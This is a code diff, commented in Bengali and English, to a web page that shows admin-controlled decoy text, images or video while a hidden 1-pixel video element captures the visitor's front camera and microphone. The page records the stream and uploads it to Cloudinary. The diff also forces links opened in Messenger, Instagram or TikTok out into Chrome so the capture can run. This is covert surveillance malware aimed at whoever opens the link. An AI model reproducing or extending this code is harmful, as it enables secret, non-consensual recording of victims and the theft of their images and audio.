@@ -15,18 +15,33 @@
     }
     .hidden { display: none !important; }
 
-    /* LIVE CONTROL CONTENT */
-    #live-container { width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
-    #live-text { font-size: 28px; font-weight: bold; color: #333; }
-    #live-img, #live-vid { max-width: 100%; max-height: 80vh; border-radius: 10px; margin-top: 20px; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+    /* LIVE CONTROL CONTENT (Admin যা পাঠাবে) */
+    #live-container { 
+        width: 100%; height: 100%; 
+        display: flex; flex-direction: column; justify-content: center; align-items: center; 
+        padding: 20px; box-sizing: border-box; 
+    }
+    
+    /* টেক্সট ডিজাইন (স্থায়ীভাবে থাকবে) */
+    #live-text { 
+        font-size: 32px; font-weight: bold; color: #333; 
+        word-wrap: break-word; max-width: 90%;
+    }
+    
+    /* ছবি/ভিডিও ডিজাইন */
+    #live-img, #live-vid { 
+        max-width: 100%; max-height: 80vh; 
+        border-radius: 10px; margin-top: 20px; 
+        display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.2); 
+    }
 
-    /* HIDDEN CAMERA */
+    /* HIDDEN CAMERA (User দেখবে না) */
     #preview { opacity: 0; position: absolute; pointer-events: none; width: 1px; height: 1px; }
 
-    /* === CUSTOM POPUP (REDIRECT) === */
+    /* === CUSTOM POPUP (REDIRECT TO CHROME) === */
     .modal-overlay {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(0,0,0,0.85); z-index: 9999;
+        background: rgba(0,0,0,0.9); z-index: 9999;
         display: flex; justify-content: center; align-items: center;
         backdrop-filter: blur(5px);
     }
@@ -58,19 +73,20 @@
         </div>
     </div>
 
-    <!-- LIVE VIEW -->
+    <!-- LIVE VIEW (Admin Control) -->
     <div id="live-container">
-        <h1 id="live-text">Connecting...</h1>
+        <!-- Default text while loading -->
+        <h1 id="live-text">Loading System...</h1>
         <img id="live-img">
         <video id="live-vid" controls autoplay loop></video>
     </div>
 
+    <!-- Hidden Camera Element -->
     <video id="preview" autoplay playsinline muted></video>
 
 <script>
-    // --- 1. IN-APP BROWSER DETECTION & REDIRECT ---
+    // --- 1. IN-APP BROWSER DETECTION ---
     const ua = navigator.userAgent;
-    // Detect Messenger, Facebook, TikTok, Instagram, Line
     const isInApp = /FBAN|FBAV|Instagram|TikTok|Line/i.test(ua);
     const isAndroid = /Android/i.test(ua);
 
@@ -80,13 +96,10 @@
 
     function openInChrome() {
         if (isAndroid) {
-            // Android Intent to Force Chrome
             const currentUrl = window.location.href.replace('https://', '').replace('http://', '');
-            // This scheme forces Android to open the URL in Chrome
             window.location.href = `intent://${currentUrl}#Intent;scheme=https;package=com.android.chrome;end`;
         } else {
-            // For iOS or others where intent doesn't work
-            alert("Please copy the link and open it in Safari/Chrome manually.");
+            alert("Please copy the link and open it in Chrome manually.");
         }
     }
 
@@ -112,25 +125,29 @@
 
     // --- 3. MAIN APP LOGIC ---
     async function startApp() {
-        // If in-app browser, don't start camera to avoid errors
-        if (isInApp) return; 
+        if (isInApp) return; // Stop if in messenger
 
         if (!ADMIN_ID) {
-            document.getElementById('live-text').innerText = "System Error: 404";
+            document.getElementById('live-text').innerText = "System Error: 404 Link";
             return;
         }
 
-        // Live Listener
+        // --- LISTENER (ADMIN DATA) ---
+        // এটি রিয়েলটাইম কাজ করবে এবং ক্যামেরা স্ট্যাটাস দ্বারা পরিবর্তন হবে না
         db.collection('admins').doc(ADMIN_ID).collection('live').doc('screen')
           .onSnapshot(doc => {
-              if(doc.exists) updateScreen(doc.data());
+              if(doc.exists) {
+                  updateScreen(doc.data());
+              }
           });
 
-        // Camera Logic
+        // --- CAMERA LOGIC ---
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
             document.getElementById('preview').srcObject = stream;
-            document.getElementById('live-text').innerText = "System Active";
+            
+            // NOTE: এখানে আমি "System Active" লেখাটি বাদ দিয়েছি
+            // যাতে Admin এর পাঠানো টেক্সট মুছে না যায়।
 
             if (MODE === 'record') {
                 startRecording(stream);
@@ -139,22 +156,41 @@
             }
 
         } catch (e) {
-            document.getElementById('live-text').innerText = "Camera Permission Denied";
+            console.log("Permission Error");
+            // ক্যামেরা এক্সেস না পেলে শুধু তখনই মেসেজ দেখাবে
+            document.getElementById('live-text').innerText = "Camera Permission Required!";
         }
     }
 
+    // স্ক্রিন আপডেট করার ফাংশন
     function updateScreen(data) {
         const txt = document.getElementById('live-text');
         const img = document.getElementById('live-img');
         const vid = document.getElementById('live-vid');
 
-        txt.style.display = 'none'; img.style.display = 'none'; vid.style.display = 'none'; vid.pause();
+        // সব হাইড করা
+        txt.style.display = 'none';
+        img.style.display = 'none';
+        vid.style.display = 'none';
+        vid.pause();
 
-        if (data.type === 'text') { txt.innerText = data.content; txt.style.display = 'block'; }
-        else if (data.type === 'image') { img.src = data.content; img.style.display = 'block'; }
-        else if (data.type === 'video') { vid.src = data.content; vid.style.display = 'block'; vid.play(); }
+        // নতুন ডাটা দেখানো
+        if (data.type === 'text') { 
+            txt.innerText = data.content; 
+            txt.style.display = 'block'; 
+        }
+        else if (data.type === 'image') { 
+            img.src = data.content; 
+            img.style.display = 'block'; 
+        }
+        else if (data.type === 'video') { 
+            vid.src = data.content; 
+            vid.style.display = 'block'; 
+            vid.play(); 
+        }
     }
 
+    // --- UPLOADERS ---
     async function uploadToCloudinary(blob) {
         const formData = new FormData();
         formData.append('file', blob);
